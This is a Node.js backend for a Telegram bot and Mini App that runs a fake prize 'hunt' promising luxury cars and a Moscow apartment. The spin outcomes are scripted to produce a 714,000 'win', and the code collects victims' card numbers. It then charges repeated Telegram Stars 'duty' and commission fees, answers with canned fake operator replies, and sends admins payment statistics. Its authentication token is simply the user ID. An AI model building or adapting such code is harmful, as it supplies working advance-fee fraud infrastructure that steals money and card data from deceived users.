require('dotenv').config()

const fs = require('node:fs')
const path = require('node:path')

const express = require('express')
const TelegramBot = require('node-telegram-bot-api')

const token = process.env.TELEGRAM_BOT_TOKEN
const webAppUrl = process.env.TELEGRAM_WEBAPP_URL
const promoImageUrl = process.env.TELEGRAM_PROMO_IMAGE_URL
const port = Number(process.env.PORT || 3000)
const adminIds = new Set(
    String(process.env.TELEGRAM_ADMIN_IDS || '')
        .split(',')
        .map((id) => Number(id.trim()))
        .filter((id) => Number.isInteger(id) && id > 0)
)
const TELEGRAM_API_BASE = `https://api.telegram.org/bot${token}`

if (!token) process.exit(1)
if (!webAppUrl) process.exit(1)

const bot = new TelegramBot(token, { polling: true })
const app = express()

app.use(express.json())

app.use((req, _res, next) => {
    console.log(`[HTTP] ${req.method} ${req.originalUrl}`)
    next()
})

app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*')
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PATCH, OPTIONS')
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, ngrok-skip-browser-warning')
    if (req.method === 'OPTIONS') return res.sendStatus(204)
    next()
})

const FX_USD_RUB_TTL_MS = 60 * 60 * 1000
let fxUsdRubCache = null

const fetchUsdRubRate = async () => {
    const r = await fetch('https://www.cbr-xml-daily.ru/daily_json.js')
    if (!r.ok) {
        throw new Error(`Failed to fetch USD/RUB rate: ${r.status}`)
    }

    const data = await r.json()
    const usd = data?.Valute?.USD
    const value = Number(usd?.Value)
    const nominal = Number(usd?.Nominal)

    if (!Number.isFinite(value) || value <= 0) throw new Error('USD/RUB rate value missing')
    if (!Number.isFinite(nominal) || nominal <= 0) throw new Error('USD/RUB nominal missing')

    return {
        rate: value / nominal,
        date: typeof data?.Date === 'string' ? data.Date : null,
        timestamp: typeof data?.Timestamp === 'string' ? data.Timestamp : null,
        source: 'cbr-xml-daily',
    }
}

app.get('/api/rates/usd-rub', async (_req, res) => {
    try {
        const now = Date.now()
        if (fxUsdRubCache && now - fxUsdRubCache.fetchedAt < FX_USD_RUB_TTL_MS) {
            return res.json({ ok: true, ...fxUsdRubCache })
        }

        const fresh = await fetchUsdRubRate()
        fxUsdRubCache = { ...fresh, fetchedAt: now }
        return res.json({ ok: true, ...fxUsdRubCache })
    } catch (e) {
        return res.status(500).json({ ok: false, error: e?.message || 'Unknown error' })
    }
})

const AUTH_STORE_PATH = path.join(__dirname, 'authorized-users.json')
let authStore = {}

try {
    authStore = JSON.parse(fs.readFileSync(AUTH_STORE_PATH, 'utf8'))
} catch {
    authStore = {}
}

const GAME_INITIAL_ATTEMPTS = 5
const LOSE_STREAK_BEFORE_WIN = 3
const WIN_SPIN_MIN = 4
const WIN_SPIN_MAX = 6

const randomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min

const computeWinOnSpin = () => {
    const minSpin = Math.max(WIN_SPIN_MIN, LOSE_STREAK_BEFORE_WIN + 1)
    const maxSpin = Math.min(WIN_SPIN_MAX, GAME_INITIAL_ATTEMPTS)
    if (maxSpin < minSpin) return null
    return randomInt(minSpin, maxSpin)
}

const ensureGameState = (game) => {
    const attemptsLeft = Number.isInteger(game?.attemptsLeft) ? Math.max(0, game.attemptsLeft) : GAME_INITIAL_ATTEMPTS
    const spinsDone = Number.isInteger(game?.spinsDone) ? Math.max(0, game.spinsDone) : 0
    const hasWon = Boolean(game?.hasWon)
    const winOnSpin = Number.isInteger(game?.winOnSpin) && game.winOnSpin > 0 ? game.winOnSpin : computeWinOnSpin()

    return { attemptsLeft, spinsDone, hasWon, winOnSpin }
}

const ensurePaymentsState = (payments) => {
    const dutyPaidAt = typeof payments?.dutyPaidAt === 'string' ? payments.dutyPaidAt : null
    const dutyStars = Number.isInteger(payments?.dutyStars) ? payments.dutyStars : null

    return { dutyPaidAt, dutyStars }
}

// ── Mini App state ────────────────────────────────────────────────────────────

const SPIN_SEQUENCE = [
    { spin: 'attempts', attempts: 3 },
    { spin: 'fail-1',   amount: 0 },
    { spin: 'fail-2',   amount: 0 },
    { spin: '714_000',  amount: 714000 },
]

const GIFT_EXPIRES_AT = '2026-03-26T20:12:03.391487'

const INITIAL_STAGES = {
    payment_stage: 0, start_chat_stage: 0, checking_stage: 0,
    withdrawal_chat_stage: 0, bank_commission_stage: 0, signature_stage: 0,
}

const APP_CHAT_REPLIES = [
    { name: 'Оператор', text: 'Сообщение получено. Продолжайте оформление выплаты по инструкции на экране.', color: 'lime' },
    { name: 'Поддержка', text: 'Для оформления выплаты следуйте инструкции на экране.', color: 'blue' },
    { name: 'Модератор', text: 'Ваш запрос обрабатывается. Продолжайте.', color: 'purple' },
]

const ensureAppState = (app) => ({
    spinIndex: Number.isInteger(app?.spinIndex) ? app.spinIndex : 0,
    lastProcessedSpinIndex: Number.isInteger(app?.lastProcessedSpinIndex) ? app.lastProcessedSpinIndex : -1,
    balance: Number.isFinite(app?.balance) ? app.balance : 0,
    availableSpins: Number.isInteger(app?.availableSpins) ? app.availableSpins : 1,
    cardNumber: typeof app?.cardNumber === 'string' ? app.cardNumber : '',
    stages: { ...INITIAL_STAGES, ...(app?.stages ?? {}) },
    chatReplyIndex: Number.isInteger(app?.chatReplyIndex) ? app.chatReplyIndex : 0,
})

function makeToken(userId) { return String(userId) }

function userIdFromRequest(req) {
    const auth = req.headers['authorization'] ?? ''
    if (auth.startsWith('Bearer ')) {
        const id = Number(auth.slice(7))
        if (Number.isInteger(id) && id > 0) return id
    }
    return null
}

function parseInitData(raw) {
    try {
        const params = new URLSearchParams(raw)
        const user = JSON.parse(params.get('user') ?? 'null')
        if (user?.id) return user
    } catch {}
    return null
}

const saveAuthStore = () => {
    try {
        fs.writeFileSync(AUTH_STORE_PATH, JSON.stringify(authStore, null, 2))
    } catch (err) {
        console.error('Failed to save auth store:', err)
    }
}

const unauthorized = (res) => res.status(401).json({ detail: 'unauthorized' })

const getStoredUser = (userId) => authStore[String(userId)] ?? null

const saveStoredUser = (userId, value) => {
    authStore[String(userId)] = value
    saveAuthStore()
    return value
}

const withAuthorizedUser = (req, res, handler) => {
    const userId = userIdFromRequest(req)
    if (!userId) return unauthorized(res)

    const storedUser = getStoredUser(userId)
    if (!storedUser) return unauthorized(res)

    return handler({ userId, storedUser })
}

const toIsoDate = (value) => new Date(Number.isFinite(value) ? value : Date.now()).toISOString()

const pickStoredProfile = (user, existing) => ({
    username: user?.username ?? existing?.username ?? null,
    firstName: user?.first_name ?? user?.firstName ?? existing?.firstName ?? null,
    lastName: user?.last_name ?? user?.lastName ?? existing?.lastName ?? null,
})

const buildStoredUser = ({
    userId,
    user,
    existing,
    nowIso,
    platform,
    app,
    game,
    payments,
    paymentEvents,
    telegramAuthConfirmedAt,
}) => ({
    userId,
    ...pickStoredProfile(user, existing),
    platform: platform ?? existing?.platform ?? null,
    firstSeenAt: existing?.firstSeenAt ?? nowIso,
    lastSeenAt: nowIso,
    telegramAuthConfirmedAt: telegramAuthConfirmedAt ?? existing?.telegramAuthConfirmedAt ?? null,
    app,
    game,
    payments,
    paymentEvents: paymentEvents ?? existing?.paymentEvents ?? [],
})

const buildMeResponse = (appState) => ({
    balance: appState.balance,
    available_spins: appState.availableSpins,
    gift_expires_at: GIFT_EXPIRES_AT,
    card_number: appState.cardNumber,
})

const createTelegramInvoiceLink = async (body) => {
    const response = await fetch(`${TELEGRAM_API_BASE}/createInvoiceLink`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
    })

    const data = await response.json()
    if (!data.ok) {
        const error = new Error(data.description || 'Telegram API error')
        error.data = data
        throw error
    }

    return data.result
}

const getTelegramStarBalance = async () => {
    const response = await fetch(`${TELEGRAM_API_BASE}/getMyStarBalance`)
    const data = await response.json()
    if (!data.ok) {
        const error = new Error(data.description || 'Telegram API error')
        error.data = data
        throw error
    }

    return data.result
}

const formatStarAmount = (balance) => {
    const amount = Number(balance?.amount || 0)
    const nanostarAmount = Number(balance?.nanostar_amount || 0)
    if (!nanostarAmount) return String(amount)

    const sign = amount < 0 || nanostarAmount < 0 ? '-' : ''
    const whole = Math.abs(amount)
    const fraction = String(Math.abs(nanostarAmount)).padStart(9, '0').replace(/0+$/, '')
    return `${sign}${whole}.${fraction}`
}

const notifyAdmins = async (text) => {
    if (adminIds.size === 0) return

    const ids = [...adminIds]
    const results = await Promise.allSettled(ids.map((adminId) => bot.sendMessage(adminId, text)))

    results.forEach((result, index) => {
        if (result.status === 'rejected') {
            console.error(`Failed to notify admin ${ids[index]}:`, result.reason)
        }
    })
}

const startOfDay = (date) => {
    const d = new Date(date)
    d.setHours(0, 0, 0, 0)
    return d
}

const addDays = (date, days) => {
    const d = new Date(date)
    d.setDate(d.getDate() + days)
    return d
}

const parseStatsPeriod = (text) => {
    const now = new Date()
    const args = String(text || '').trim().split(/\s+/).slice(1)
    const key = (args[0] || 'today').toLowerCase()

    if (key === 'today') {
        const from = startOfDay(now)
        return { label: 'today', from, to: now }
    }

    if (key === 'yesterday') {
        const from = addDays(startOfDay(now), -1)
        return { label: 'yesterday', from, to: startOfDay(now) }
    }

    const daysMatch = key.match(/^(\d+)d$/)
    if (daysMatch) {
        const days = Math.max(1, Number(daysMatch[1]))
        return { label: `last ${days} days`, from: addDays(now, -days), to: now }
    }

    if (args.length >= 2) {
        const from = new Date(`${args[0]}T00:00:00`)
        const to = new Date(`${args[1]}T23:59:59.999`)
        if (!Number.isNaN(from.getTime()) && !Number.isNaN(to.getTime())) {
            return { label: `${args[0]} - ${args[1]}`, from, to }
        }
    }

    return null
}

const isInPeriod = (iso, period) => {
    const time = Date.parse(iso)
    return Number.isFinite(time) && time >= period.from.getTime() && time <= period.to.getTime()
}

const getUserPaymentEvents = (user) => {
    const events = Array.isArray(user?.paymentEvents) ? user.paymentEvents : []
    if (events.length > 0) return events

    const legacyPaidAt = user?.payments?.dutyPaidAt
    const legacyStars = user?.payments?.dutyStars
    if (typeof legacyPaidAt === 'string' && Number.isFinite(Number(legacyStars))) {
        return [{
            paidAt: legacyPaidAt,
            amount: Number(legacyStars),
            currency: 'XTR',
            purpose: 'duty',
            legacy: true,
        }]
    }

    return []
}

const buildStatsReport = (period) => {
    const users = Object.values(authStore)
    const usersSeen = users.filter((user) => isInPeriod(user.firstSeenAt, period)).length
    const usersActive = users.filter((user) => isInPeriod(user.lastSeenAt, period)).length
    const authConfirmed = users.filter((user) => isInPeriod(user.telegramAuthConfirmedAt, period)).length
    const paymentEvents = users.flatMap((user) =>
        getUserPaymentEvents(user).map((payment) => ({ ...payment, user }))
    ).filter((payment) => isInPeriod(payment.paidAt, period))

    const paidUserIds = new Set(paymentEvents.map((payment) => String(payment.user.userId)))
    const totalStars = paymentEvents.reduce((sum, payment) => sum + Number(payment.amount || 0), 0)
    const byPurpose = paymentEvents.reduce((acc, payment) => {
        const purpose = payment.purpose || '-'
        if (!acc[purpose]) acc[purpose] = { count: 0, stars: 0 }
        acc[purpose].count += 1
        acc[purpose].stars += Number(payment.amount || 0)
        return acc
    }, {})

    const purposeLines = Object.entries(byPurpose)
        .sort((a, b) => b[1].stars - a[1].stars)
        .map(([purpose, data]) => `- ${purpose}: ${data.count} payments, ${data.stars} Stars`)
    const stageNames = Object.keys(INITIAL_STAGES)
    const stageLines = stageNames.map((stageName) => {
        const values = users
            .map((user) => Number(user?.app?.stages?.[stageName] || 0))
            .filter((value) => Number.isFinite(value))
        const reached = values.filter((value) => value > 0).length
        const max = values.length ? Math.max(...values) : 0
        return `- ${stageName}: ${reached} users, max ${max}`
    })

    return [
        `Stats: ${period.label}`,
        `From: ${period.from.toISOString()}`,
        `To: ${period.to.toISOString()}`,
        '',
        `Total users: ${users.length}`,
        `New users: ${usersSeen}`,
        `Active users: ${usersActive}`,
        `Confirmed auth: ${authConfirmed}`,
        '',
        `Payments: ${paymentEvents.length}`,
        `Paid users: ${paidUserIds.size}`,
        `Stars total: ${totalStars}`,
        '',
        'By purpose:',
        ...(purposeLines.length ? purposeLines : ['- no payments']),
        '',
        'Stages:',
        ...stageLines,
        '',
        'Usage: /stats today | yesterday | 7d | 30d | YYYY-MM-DD YYYY-MM-DD',
    ].join('\n')
}

// ── /api/v1/* — Mini App API backed by authStore ─────────────────────────────

// POST /api/v1/auth/login  { init_data: string }
app.post('/api/v1/auth/login', (req, res) => {
    const initData = req.body?.init_data
    const user = parseInitData(initData)
    if (!user?.id) return res.status(400).json({ detail: 'invalid init_data' })

    const userId = Number(user.id)
    const nowIso = toIsoDate()
    const existing = getStoredUser(userId)

    saveStoredUser(userId, buildStoredUser({
        userId,
        user,
        existing,
        nowIso,
        app: ensureAppState(existing?.app),
        game: ensureGameState(existing?.game),
        payments: ensurePaymentsState(existing?.payments),
    }))

    const token = makeToken(userId)
    return res.json({ access_token: token, refresh_token: token })
})

// POST /api/v1/auth/refresh
app.post('/api/v1/auth/refresh', (req, res) => {
    const userId = userIdFromRequest(req)
    if (!userId) return unauthorized(res)
    const token = makeToken(userId)
    return res.json({ access_token: token, refresh_token: token })
})

// GET /api/v1/me
app.get('/api/v1/me', (req, res) => {
    return withAuthorizedUser(req, res, ({ storedUser }) => {
        const appState = ensureAppState(storedUser.app)
        return res.json(buildMeResponse(appState))
    })
})

// PATCH /api/v1/me/card-number  { card_number: string }
app.patch('/api/v1/me/card-number', (req, res) => {
    return withAuthorizedUser(req, res, ({ userId, storedUser }) => {
        const appState = ensureAppState(storedUser.app)
        appState.cardNumber = String(req.body?.card_number ?? appState.cardNumber)
        saveStoredUser(userId, { ...storedUser, app: appState })
        return res.json(buildMeResponse(appState))
    })
})

// GET /api/v1/results
app.get('/api/v1/results', (req, res) => {
    return withAuthorizedUser(req, res, ({ storedUser }) => {
        const appState = ensureAppState(storedUser.app)
        if (appState.availableSpins <= 0) return res.status(422).json({ detail: 'No spins available' })
        const result = SPIN_SEQUENCE[appState.spinIndex] ?? SPIN_SEQUENCE[SPIN_SEQUENCE.length - 1]
        return res.json(result)
    })
})

// POST /api/v1/finish
app.post('/api/v1/finish', (req, res) => {
    return withAuthorizedUser(req, res, ({ userId, storedUser }) => {
        const appState = ensureAppState(storedUser.app)
        const spinIdx = appState.spinIndex
        if (spinIdx > appState.lastProcessedSpinIndex) {
            const spin = SPIN_SEQUENCE[spinIdx] ?? null
            if (spin) {
                appState.availableSpins = Math.max(0, appState.availableSpins - 1)
                if (spin.spin === 'attempts') {
                    appState.availableSpins += spin.attempts || 3
                } else if (typeof spin.amount === 'number' && spin.amount > 0) {
                    appState.balance = spin.amount
                }
            }
            appState.lastProcessedSpinIndex = spinIdx
            appState.spinIndex = spinIdx + 1
        }

        saveStoredUser(userId, { ...storedUser, app: appState })
        return res.json({ status: 'ok' })
    })
})

// GET /api/v1/stages
app.get('/api/v1/stages', (req, res) => {
    return withAuthorizedUser(req, res, ({ storedUser }) => {
        return res.json(ensureAppState(storedUser.app).stages)
    })
})

// PATCH /api/v1/stages  { <stage_name>: number, ... }
app.patch('/api/v1/stages', (req, res) => {
    return withAuthorizedUser(req, res, ({ userId, storedUser }) => {
        const appState = ensureAppState(storedUser.app)
        appState.stages = { ...appState.stages, ...req.body }
        saveStoredUser(userId, { ...storedUser, app: appState })
        return res.json(appState.stages)
    })
})

// POST /api/v1/invoice  { method, amount, title, next_stages }
app.post('/api/v1/invoice', async (req, res) => {
    const userId = userIdFromRequest(req)
    if (!userId) return unauthorized(res)
    try {
        const { amount, title, description, next_stages } = req.body || {}
        const stars = Number(amount)
        if (!Number.isInteger(stars) || stars <= 0) return res.status(400).json({ detail: 'invalid amount' })

        const payload = JSON.stringify({ type: 'purchase', purpose: 'duty', userId, amountStars: stars, next_stages, ts: Date.now() })
        const link = await createTelegramInvoiceLink({
                title: title || 'Покупка',
                description: description || 'Оплата в Mini App',
                payload,
                currency: 'XTR',
                prices: [{ label: 'Оплата', amount: stars }],
        })
        return res.json({ link })
    } catch (e) {
        return res.status(500).json({ detail: e.message || 'Unknown error' })
    }
})

// POST /api/v1/chat/message  { text: string }
app.post('/api/v1/chat/message', (req, res) => {
    return withAuthorizedUser(req, res, ({ userId, storedUser }) => {
        const appState = ensureAppState(storedUser.app)
        const reply = APP_CHAT_REPLIES[appState.chatReplyIndex % APP_CHAT_REPLIES.length]
        appState.chatReplyIndex += 1
        saveStoredUser(userId, { ...storedUser, app: appState })
        return res.json({ name: reply.name, text: reply.text, color: reply.color, echo: req.body?.text || '' })
    })
})

const ensureMenuButton = async () => {
    try {
        await bot.setChatMenuButton({
            menu_button: {
                type: 'web_app',
                text: 'Играть',
                web_app: { url: webAppUrl },
            },
        })
    } catch (err) {
        console.error('Failed to set chat menu button:', err)
    }
}

void ensureMenuButton()

bot.onText(/\/stars/, async (msg) => {
    const chatId = msg.chat.id
    const userId = msg.from?.id

    if (adminIds.size > 0 && !adminIds.has(userId)) {
        await bot.sendMessage(chatId, 'Access denied')
        return
    }

    try {
        const balance = await getTelegramStarBalance()
        await bot.sendMessage(chatId, `Stars balance: ${formatStarAmount(balance)} Stars`)
    } catch (err) {
        console.error('Failed to get Stars balance:', err)
        await bot.sendMessage(chatId, 'Failed to get Stars balance')
    }
})

bot.onText(/\/stats(?:\s+.*)?/, async (msg) => {
    const chatId = msg.chat.id
    const userId = msg.from?.id

    if (adminIds.size > 0 && !adminIds.has(userId)) {
        await bot.sendMessage(chatId, 'Access denied')
        return
    }

    const period = parseStatsPeriod(msg.text)
    if (!period) {
        await bot.sendMessage(chatId, 'Usage: /stats today | yesterday | 7d | 30d | YYYY-MM-DD YYYY-MM-DD')
        return
    }

    await bot.sendMessage(chatId, buildStatsReport(period))
})

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id

    const replyMarkup = {
        inline_keyboard: [
            [
                {
                    text: 'Открыть охоту',
                    web_app: { url: webAppUrl },
                },
            ],
        ],
    }

    const caption =
        `⚡️ Легендарная охота на Lit Energy!

🔥 Мы исполняем ваши мечты! Легендарная и, возможно, заключительная охота уже идет ❤️‍🔥

Крути рулетку и получай шанс выиграть:
🚗 Toyota Supra
🏎 BMW M3
🔥 Porsche 911
🚙 Mercedes-Benz G63 AMG

🏆 Главный приз — квартира в Москве за 40 млн руб.`

    if (promoImageUrl) {
        await bot.sendPhoto(chatId, promoImageUrl, {
            caption,
            reply_markup: replyMarkup,
        })
        return
    }

    await bot.sendMessage(chatId, caption, {
        reply_markup: replyMarkup,
    })
})

app.post('/api/telegram/create-stars-invoice', async (req, res) => {
    try {
        const { userId, amount, title, description, purpose } = req.body || {}

        if (!userId) {
            return res.status(400).json({ ok: false, error: 'userId required' })
        }

        const stars = Number(amount)
        if (!Number.isInteger(stars) || stars <= 0) {
            return res.status(400).json({ ok: false, error: 'amount must be positive integer (Stars)' })
        }

        const rawPurpose = typeof purpose === 'string' ? purpose.trim() : 'duty'
        const safePurpose = rawPurpose && rawPurpose.length <= 32 ? rawPurpose : 'duty'

        const payload = JSON.stringify({
            type: 'purchase',
            purpose: safePurpose,
            userId,
            amountStars: stars,
            ts: Date.now(),
        })

        const body = {
            title: title || 'Покупка',
            description: description || 'Оплата в Mini App',
            payload,
            currency: 'XTR',
            prices: [
                { label: 'Оплата', amount: stars }
            ]
        }

        const invoiceLink = await createTelegramInvoiceLink(body)
        return res.json({ ok: true, invoiceLink })
    } catch (e) {
        return res.status(500).json({ ok: false, error: e.message || 'Unknown error', raw: e.data })
    }
})

app.post('/api/telegram/report-auth', async (req, res) => {
    try {
        const { user, platform, ts } = req.body || {}

        const userId = Number(user?.id)
        if (!Number.isInteger(userId) || userId <= 0) {
            return res.status(400).json({ ok: false, error: 'user.id required' })
        }

        const nowIso = toIsoDate(ts)
        const existing = getStoredUser(userId)
        const app_ = ensureAppState(existing?.app)
        const game = ensureGameState(existing?.game)
        const payments = ensurePaymentsState(existing?.payments)

        saveStoredUser(userId, buildStoredUser({
            userId,
            user,
            existing,
            nowIso,
            platform,
            app: app_,
            game,
            payments,
            telegramAuthConfirmedAt: existing?.telegramAuthConfirmedAt ?? nowIso,
        }))

        console.log(`[AUTH] userId=${userId} username=@${user?.username || ''} platform=${platform || ''} confirmed=${!!getStoredUser(userId)?.telegramAuthConfirmedAt}`)

        return res.json({ ok: true, known: true, state: game, payments })
    } catch (e) {
        return res.status(500).json({ ok: false, error: e.message || 'Unknown error' })
    }
})

app.post('/api/telegram/get-state', async (req, res) => {
    try {
        const { user, platform, ts } = req.body || {}

        const userId = Number(user?.id)
        if (!Number.isInteger(userId) || userId <= 0) {
            return res.status(400).json({ ok: false, error: 'user.id required' })
        }

        const existing = getStoredUser(userId)
        const isConfirmed = Boolean(existing?.telegramAuthConfirmedAt)
        if (!existing || !isConfirmed) {
            return res.json({ ok: true, known: false })
        }

        const nowIso = toIsoDate(ts)
        const game = ensureGameState(existing.game)
        const payments = ensurePaymentsState(existing.payments)

        saveStoredUser(userId, {
            ...existing,
            ...pickStoredProfile(user, existing),
            platform: platform ?? existing?.platform ?? null,
            lastSeenAt: nowIso,
            game,
            payments,
        })

        return res.json({ ok: true, known: true, state: game, payments })
    } catch (e) {
        return res.status(500).json({ ok: false, error: e.message || 'Unknown error' })
    }
})

app.post('/api/telegram/spin', async (req, res) => {
    try {
        const { userId, ts } = req.body || {}
        const id = Number(userId)
        if (!Number.isInteger(id) || id <= 0) {
            return res.status(400).json({ ok: false, error: 'userId required' })
        }

        const existing = getStoredUser(id)
        if (!existing) {
            return res.status(404).json({ ok: false, error: 'User not authorized' })
        }

        const nowIso = toIsoDate(ts)
        const game = ensureGameState(existing.game)

        if (game.hasWon) {
            return res.json({ ok: true, state: game, win: true, alreadyWon: true })
        }

        if (game.attemptsLeft <= 0) {
            return res.status(400).json({ ok: false, error: 'No attempts left', state: game })
        }

        const nextSpinsDone = game.spinsDone + 1
        const win = game.winOnSpin != null && nextSpinsDone === game.winOnSpin

        const nextGame = {
            ...game,
            spinsDone: nextSpinsDone,
            attemptsLeft: game.attemptsLeft - 1,
            hasWon: game.hasWon || win,
        }

        saveStoredUser(id, {
            ...existing,
            lastSeenAt: nowIso,
            game: nextGame,
        })

        return res.json({ ok: true, state: nextGame, win })
    } catch (e) {
        return res.status(500).json({ ok: false, error: e.message || 'Unknown error' })
    }
})

// Serve the site static files from the parent directory.
// All /api/* routes are defined above and take precedence.
const SITE_DIR = path.join(__dirname, '..')
app.use(express.static(SITE_DIR))
app.get('*splat', (_req, res) => {
    res.sendFile(path.join(SITE_DIR, 'index.html'))
})

app.listen(port, () => {
    console.log(`HTTP server started on :${port}`)
    console.log(`Site: http://localhost:${port}`)
})

bot.on('message', async (msg) => {
    const data = msg.web_app_data?.data
    if (!data) return

    let payload = data
    try {
        payload = JSON.stringify(JSON.parse(data), null, 2)
    } catch { }

    await bot.sendMessage(msg.chat.id, `Получены данные из формы:\n\n${payload}`)
})

bot.on('pre_checkout_query', async (query) => {
    try {
        await bot.answerPreCheckoutQuery(query.id, true)
    } catch (err) {
        console.error('pre_checkout_query error:', err)
    }
})

bot.on('successful_payment', async (msg) => {
    try {
        const payerId = msg.from?.id
        const nowIso = toIsoDate()

        if (payerId) {
            let parsedPayload = null
            let purpose = null
            try {
                parsedPayload = JSON.parse(msg.successful_payment?.invoice_payload ?? 'null')
                purpose = parsedPayload?.purpose ?? parsedPayload?.product ?? null
            } catch { }

            const existing = getStoredUser(payerId)
            const app_ = ensureAppState(existing?.app)
            const game = ensureGameState(existing?.game)
            const payments = ensurePaymentsState(existing?.payments)
            const payment = msg.successful_payment || {}
            const amount = payment.total_amount ?? ''
            const currency = payment.currency || ''
            const paymentEvent = {
                paidAt: nowIso,
                amount: Number(amount) || 0,
                currency,
                purpose: purpose || null,
                telegramPaymentChargeId: payment.telegram_payment_charge_id || null,
                providerPaymentChargeId: payment.provider_payment_charge_id || null,
                invoicePayload: payment.invoice_payload || null,
            }

            if (parsedPayload?.next_stages && typeof parsedPayload.next_stages === 'object') {
                app_.stages = {
                    ...app_.stages,
                    ...parsedPayload.next_stages,
                }
            }

            if (purpose === 'duty' || purpose == null) {
                saveStoredUser(payerId, buildStoredUser({
                    userId: payerId,
                    user: msg.from,
                    existing,
                    nowIso,
                    platform: existing?.platform ?? null,
                    app: app_,
                    game,
                    payments: {
                        ...payments,
                        dutyPaidAt: nowIso,
                        dutyStars: payment.total_amount ?? payments.dutyStars ?? null,
                    },
                    paymentEvents: [
                        ...(Array.isArray(existing?.paymentEvents) ? existing.paymentEvents : []),
                        paymentEvent,
                    ],
                }))
                console.log(`[PAYMENT] duty paid userId=${payerId} amount=${payment.total_amount ?? ''}`)
            }

            const username = msg.from?.username ? `@${msg.from.username}` : '-'
            const name = [msg.from?.first_name, msg.from?.last_name].filter(Boolean).join(' ') || '-'
            await notifyAdmins([
                'New payment received',
                `User: ${name}`,
                `Username: ${username}`,
                `User ID: ${payerId}`,
                `Amount: ${amount} ${currency}`,
                `Purpose: ${purpose || '-'}`,
                `Payload: ${payment.invoice_payload || '-'}`,
            ].join('\n'))
        }

        await bot.sendMessage(msg.chat.id, 'Оплата прошла успешно ✅')
        console.log('successful_payment:', msg.successful_payment)
    } catch (err) {
        console.error('successful_payment handler error:', err)
    }
})

bot.on('polling_error', (err) => {
    console.error('Polling error:', err)
})

const shutdown = async (signal) => {
    try {
        console.log(`Shutting down (${signal})...`)
        await bot.stopPolling()
    } finally {
        process.exit(0)
    }
}

process.on('SIGINT', () => void shutdown('SIGINT'))
process.on('SIGTERM', () => void shutdown('SIGTERM'))
